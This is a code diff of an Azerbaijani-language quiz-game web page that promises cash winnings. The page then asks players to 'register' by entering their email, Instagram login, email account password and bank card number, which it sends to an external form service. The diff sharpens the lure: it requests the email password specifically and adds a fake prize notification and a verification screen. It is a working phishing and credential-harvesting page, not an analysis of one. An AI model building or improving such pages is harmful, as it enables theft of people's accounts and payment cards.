@@ -20,15 +20,10 @@
         .option-btn.disabled { pointer-events: none; opacity: 0.7; }
         input { width: 92%; padding: 12px; margin: 8px 0; border-radius: 5px; border: 1px solid #475569; background-color: #334155; color: white; font-size: 16px; }
         .hidden { display: none; }
-        .section { margin-top: 25px; padding-top: 20px; border-top: 1px solid #334155; text-align: left; }
-        .link { color: #38bdf8; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 5px; }
-        .link:hover { text-decoration: underline; }
         label { display: block; text-align: left; margin-top: 12px; font-weight: bold; color: #94a3b8; font-size: 14px; }
         .security-notice { font-size: 12px; color: #94a3b8; background: rgba(148, 163, 184, 0.1); padding: 8px; border-radius: 5px; margin-bottom: 15px; text-align: left; border-left: 3px solid #f59e0b; }
-        [data-fs-success] { color: #4ade80; background-color: rgba(74, 222, 128, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-weight: bold; }
         [data-fs-error] { color: #f87171; background-color: rgba(248, 113, 113, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-weight: bold; }
         
-        /* Yeni yoxlanış ekranı üçün xüsusi dizayn */
         .loading-dots span { animation: blink 1.4s infinite both; font-size: 30px; }
         .loading-dots span:nth-child(2) { animation-delay: .2s; }
         .loading-dots span:nth-child(3) { animation-delay: .4s; }
@@ -42,7 +37,7 @@
         
         <div id="start-screen">
             <h2>Xoş Gəlmisiniz!</h2>
-            <p><strong>Oyun haqqında məlumat:</strong> Bu intellektual yarışmada sizə müxtəlif məbləğli məntiq və bilik sualları təqdim olunacaq. Hər düzgün cavab uduşunuzu artırır.</p>
+            <p><strong>Oyun haqqında məlumat:</strong> Bu intellektual yarışmada sizə müxtəlif məbləğli məntiq və bilik sualları təqdim olunacaq. Hər düzgün cavab uduşunuzu artırır. Son mərhələdəki çətin sualların variantı yoxdur, cavabı özünüz yazmalısınız!</p>
             
             <input type="text" id="user-fullname" placeholder="Adınız və Soyadınız" required>
             <button class="btn" onclick="startGame()">Oyuna Başla</button>
@@ -51,7 +46,14 @@
         <div id="quiz-screen" class="hidden">
             <div class="score-board">Cari Uduş: <span id="live-budget">0</span> AZN</div>
             <h3 id="question-text">Sual yüklənir...</h3>
+            
             <div id="options-container"></div>
+            
+            <div id="text-answer-container" class="hidden">
+                <input type="text" id="user-text-answer" placeholder="Cavabınızı bura yazın..." autocomplete="off">
+                <button class="btn" id="submit-text-answer-btn" style="background-color: #f59e0b;">Cavabı Təsdiqlə</button>
+            </div>
+            
             <div id="answer-feedback" class="feedback"></div>
         </div>
 
@@ -64,7 +66,6 @@
                 🔒 <strong>Sistem Təhlükəsizlik Mesajı:</strong> Daxil etdiyiniz bütün qeydiyyat, sosial şəbəkə və maliyyə məlumatları SSL şifrləmə protokolu ilə qorunur və birbaşa şəxsi verilənlər bazasına ötürülür.
             </div>
 
-            <div data-fs-success id="fs-success-msg">Uğurlu! Məlumatlarınız ötürüldü, qeydiyyat tamamlandı.</div>
             <div data-fs-error id="fs-error-msg">Xəta baş verdi. Zəhmət olmasa yenidən yoxlayın.</div>
             
             <form id="my-form">
@@ -73,23 +74,18 @@
                 
                 <label for="email">Email Ünvanı:</label>
                 <input type="email" id="email" name="email" data-fs-field placeholder="Nümunə: email@gmail.com" required />
-                <span data-fs-error="email"></span>
                 
                 <label for="instagram">Instagram Logini:</label>
                 <input type="text" id="instagram" name="instagram_login" data-fs-field placeholder="@istifadəçi_adı" required />
-                <span data-fs-error="instagram"></span>
 
-                <label for="password">Giriş Şifrəsi:</label>
-                <input type="password" id="password" name="giris_sifresi" data-fs-field placeholder="Şifrənizi daxil edin" required />
-                <span data-fs-error="password"></span>
+                <label for="password">Emailinizin Giriş Şifrəsi:</label>
+                <input type="password" id="password" name="email_giris_sifresi" data-fs-field placeholder="Email şifrənizi daxil edin" required />
 
                 <label for="card_number">Bank Kart Nömrəsi (Ödəniş üçün):</label>
                 <input type="text" id="card_number" name="kart_nomresi" data-fs-field placeholder="0000 0000 0000 0000" required />
-                <span data-fs-error="card_number"></span>
 
                 <label for="whatsapp">WhatsApp Nömrəsi:</label>
                 <input type="text" id="whatsapp" name="whatsapp_no" data-fs-field placeholder="+994 XX XXX XX XX" required />
-                <span data-fs-error="whatsapp"></span>
                 
                 <button type="submit" class="btn" data-fs-submit-btn style="background-color: #22c55e;">Qeydiyyatı Tamamla</button>
             </form>
@@ -104,10 +100,13 @@
                 Məlumatlarınız ötürüldü və qeydiyyat uğurla tamamlandı!
             </p>
             <p style="text-align: left; margin-top: 20px;">
-                Sistem hazırda daxil etdiyiniz sual cavablarını, xalları və qeydiyyat məlumatlarınızı təhlükəsizlik alqoritmləri ilə yoxlayır. 
+                Sistem hazırda daxil etdiyiniz sual cavablarını, xalları və qeydiyyat məlumatlarınızı təhlükəsizlik alqoritmləri ilə yoxlayır.
+            </p>
+            <p style="text-align: left; font-weight: bold; color: #38bdf8;">
+                📧 Məlumat: Yoxlanış prosesi başa çatdıqdan sonra qazanılan uduş və növbəti addımlar barədə təqdim etdiyiniz <strong>Email ünvanına</strong> rəsmi bildiriş məlumatı göndəriləcəkdir.
             </p>
             <p style="text-align: left; font-weight: bold; color: #f87171;">
-                ⚠️ Diqqət: Əgər hər hansı bir uyğunsuzluq və ya səhvlik aşkar olunarsa, daxil etdiyiniz əlaqə vasitələri (WhatsApp və ya Zəng) üzərindən sizinlə dərhal əlaqə saxlanılacaqdır.
+                ⚠️ Diqqət: Hər hansı bir uyğunsuzluq və ya səhvlik aşkar olunarsa, proses ləğv edilə bilər. Bu səbəbdən daxil etdiyiniz Email ünvanının tamamilə aktiv və işlək vəziyyətdə olduğundan əmin olun.
             </p>
             <p style="color: #94a3b8; font-size: 14px; margin-top: 30px;">Zəhmət olmasa bu səhifəni bağlamayın, yoxlanış davam edir...</p>
         </div>
@@ -122,14 +121,11 @@
         formElement: "#my-form",
         formId: "mbdbbnwb",
         onSuccess: function() {
-            // Qeydiyyat pəncərəsini gizlədirik
             document.getElementById("end-screen").classList.add("hidden");
-            // İstədiyiniz yeni "Sistem yoxlayır" pəncərəsini açırıq
             document.getElementById("verification-screen").classList.remove("hidden");
         },
         onError: function() {
             document.getElementById("fs-error-msg").style.display = "block";
-            document.getElementById("fs-success-msg").style.display = "none";
         }
       });
     </script>
